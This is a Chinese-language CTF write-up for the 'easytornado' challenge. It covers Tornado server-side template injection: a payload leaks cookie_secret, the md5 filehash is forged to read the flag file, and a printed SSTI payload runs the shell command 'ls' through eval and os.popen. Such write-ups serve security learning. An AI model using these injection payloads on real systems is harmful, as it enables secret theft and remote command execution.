### easytornado——adworld

![image-20240920154109877](C:\Users\10649\AppData\Roaming\Typora\typora-user-images\image-20240920154109877.png)

首先提示了是一个Tornado， 是一个 Python Web 框架和异步网络库，适用于处理大量并发连接的应用程序。它最初由 FriendFeed 开发，后来被 Facebook 收购。Tornado 的主要特点包括：

- **高性能**：Tornado 使用非阻塞网络 I/O，可以处理成千上万的并发连接。
- **异步编程**：支持异步编程模型，使得编写高效的网络应用程序更加容易。
- **WebSocket 支持**：内置对 WebSocket 的支持，适合实时应用。
- **灵活性**：可以与其他 Python 库和框架集成，提供高度的灵活性。

先不管那么多，目录爆破出来

/error?msg=

试一下好像所有都会显示在上面，试一下xss呢？出现个orz，没啥用啊

再试试ssti，应该是过滤了还是orz



那就继续看页面吧，有三个，flag，hint，和welcome

首先flag.txt
提示了flag in /fllllllllllllag

接着抓包发现有一个fliehash

```
3da98929f77ded08192eb708a56d0bcc 

531e1ef9ed740b7c4809cd5989614a75
--hash-identify识别出来是md5，但是md5破译不出来
尝试了welcome.txt，flag.txt都不对
```

看到hint才明白是

```
md5(cookie_secret+md5(filename))
```

什么是cookie_secret?

先把三个包全抓了

```
GET /file?filename=/flag.txt&filehash=bf608d2cbce88ab3c0f0f5e4165a6233 HTTP/1.1

Host: 61.147.171.105:60057

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://61.147.171.105:60057/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1722697678,1722697954,1722698140; last_login_info=YToxOntzOjI6ImlwIjtzOjEyOiIxMTIuNDguMjAuODciO30%3D; PHPSESSID=j6h41tko6olqgi6gcc7iri9tm5

Connection: close


```

看到这里的差别数据就是If-None-Match: "288c273b03dd3dcfb65fc8fe8146175d29ef3ee8"

我尝试一下呢？

```
#写一个md5加密
import hashlib

def md5_encrypt(string):
    m = hashlib.md5()
    m.update(string.encode('utf-8'))
    return m.hexdigest()

# 测试
string = '288c273b03dd3dcfb65fc8fe8146175d29ef3ee8'+md5_encrypt('welcome.txt')
encrypted_string = md5_encrypt(string)
print(encrypted_string)

这也不对啊
0aa2f6d187d70ad1de7cd84a4a5f4720
```

`If-None-Match` 是一个HTTP请求头，用于使请求具有条件性。以此来处理并发问题，这个并不是什么cookie_secret



问题应该是在/error?msg=的ssti测试的时候，仅考虑了flask框架的ssti而不是tornado模板注入



通过网上搜索得出几种构造模式

1 **datetime**
Python datetime 模块
比如{{ datetime.date(2022,3,7)}}返回2022-03-07

2 **handler**
当前的 RequestHandler 对象，也是tornado中HTTP请求处理的基类.那么我们可以用这个对象中的什么东西呢，这就得看他的[源代码](https://tornado-zh.readthedocs.io/zh/latest/_modules/tornado/web.html#RequestHandler)了。内容有点庞大。
可以在里面看到之前用到过的handler.settings，这就是我们要找的cookie的位置

或者，escape转换成其对应的 HTML 实体

```
{{ escape(handler.settings[“cookie”]) }}
```

可以得到

```
'cookie_secret':0fd3852b-7e3a-4e00-81c1-e504a1101052
```



再延申可以继续构造基类进行rce，比如

```
{{handler.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
```

不过没有效果，测试发现是对（）过滤了



使用cookie＋filename进行md5加密得到

```
bf608d2cbce88ab3c0f0f5e4165a6233
```

完全一致，

那直接访问/fllllllllg，构造出加密，得到shell



flag{3f39aea39db345769397ae895edb9c70}



更多延申在[tornado模板注入-CSDN博客](https://blog.csdn.net/miuzzx/article/details/123329244)
